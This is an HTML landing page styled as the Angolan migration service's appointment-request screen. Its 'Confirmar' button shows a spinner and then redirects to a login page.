<!DOCTYPE html>
<html lang="pt-AO">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="google-site-verification" content="Iz7t50_YcBHajxl1rjj9E_vef4G_viHte2eam2nMp7s" />
  <title>Serviço de Migração e Estrangeiros</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", sans-serif;
      background: linear-gradient(to right, #e3f2fd, #bbdefb);
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      background-color: white;
      border-radius: 16px;
      padding: 30px;
      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
      text-align: center;
      width: 90%;
      max-width: 500px;
    }

    .logo {
      width: 100px;
      margin-bottom: 20px;
    }

    h1 {
      font-size: 22px;
      margin-bottom: 10px;
      color: #1a237e;
    }

    h2 {
      font-size: 16px;
      color: #333;
      margin-bottom: 30px;
    }

    button {
      background-color: #1a237e;
      color: white;
      border: none;
      padding: 12px 30px;
      font-size: 16px;
      border-radius: 30px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #3949ab;
    }

    .spinner {
      margin: 20px auto;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #1a237e;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      display: none;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="sme-logo.png" alt="Logotipo do SME" class="logo" />
    <h1>Serviço de Migração e Estrangeiros</h1>
    <h2>Seja Bem-vindo</h2>
    <p>Solicitar o pedido de agendamento</p>
    <div class="spinner" id="spinner"></div>
    <button onclick="processar()">Confirmar</button>
  </div>

  <script>
    function processar() {
      const spinner = document.getElementById('spinner');
      spinner.style.display = 'block';
      setTimeout(() => {
        window.location.href = 'login.html';
      }, 2000);
    }
  </script>
</body>
</html>
